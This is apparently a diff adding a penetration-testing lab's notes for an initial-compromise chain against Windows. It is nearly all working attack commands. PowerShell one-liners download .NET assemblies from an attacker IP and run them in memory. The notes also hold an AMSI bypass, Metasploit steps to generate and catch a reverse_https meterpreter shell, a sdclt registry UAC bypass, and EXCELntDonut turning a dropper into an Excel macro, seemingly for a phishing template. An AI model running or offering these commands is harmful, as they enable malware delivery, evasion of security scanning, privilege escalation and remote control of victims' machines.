@@ -1,0 +1,56 @@
+AMSI : 
+
+$m=new-object net.webclient;$Url='http://172.16.168.134/tools/pa'; $dllByteArray=$m.downloaddata($Url); $assembly=[System.Reflection.Assembly]::Load($dllByteArray); $t=$assembly.GetType('A'); $m=$t.GetMethod('B');$m.invoke($null, @(,([String[]] @())));
+
+
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+$m=new-object net.webclient;$Url='http://172.16.168.134/tools/pd'; $dllByteArray=$m.downloaddata($Url); $assembly=[System.Reflection.Assembly]::Load($dllByteArray); $t=$assembly.GetType('Program'); $m=$t.GetMethod('Main');$m.invoke($null, $null);
+
+
+
+cd /home/kali/Desktop/UNSW/InitialCompromise/
+mcs /target:winexe /out:PetaqDropper-W.exe PetaqDropper.cs
+mcs /target:library /out:PetaqAmsiScanbuffer.dll PetaqAmsiScanbuffer.cs
+
+cp /home/kali/Desktop/UNSW/InitialCompromise/PetaqImpant.exe petaqservice/wwwroot/tools/pi
+cp /home/kali/Desktop/UNSW/InitialCompromise/meter-172.16.168.134 petaqservice/wwwroot/tools/m
+
+use payload/windows/x64/exec
+show options 
+set CMD calc
+generate -f raw -o /home/kali/Desktop/UNSW/InitialCompromise/calc
+
+use payload/windows/x64/meterpreter/reverse_https
+show options 
+set LHOST 172.16.168.134
+set LPORT 8080
+generate -f raw -o /home/kali/Desktop/UNSW/InitialCompromise/meter-172.16.168.134
+
+use exploit/multi/handler 
+show options 
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 172.16.168.134
+set LPORT 8080
+set ExitOnSession false
+
+exec-shellcode file /home/kali/Desktop/UNSW/InitialCompromise/meter-172.16.168.134 x64
+
+UAC Bypass
+exec cmd /cecho %PATH%
+upload /home/kali/Desktop/UNSW/InitialCompromise/test.bat C:\Users\dev\AppData\Local\Microsoft\WindowsApps\ubp.bat
+exec cmd /cdir C:\Users\dev\AppData\Local\Microsoft\WindowsApps\ubp.bat
+exec cmd /creg add "HKCU\Software\Classes\Folder\shell\open\command" /d "C:\Users\dev\AppData\Local\Microsoft\WindowsApps\ubp.bat" /f 
+exec cmd /creg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
+exec cmd.exe /csdclt
+
+
+Microsoft Office Template
+
+https://templates.office.com/en-au/annual-financial-report-tm00000051
+
+
+ExcelntDonut
+EXCELntDonut -f ../InitialCompromise/PetaqDropper.cs -o ../InitialCompromise/PetaqDropper-Macro.txt
+
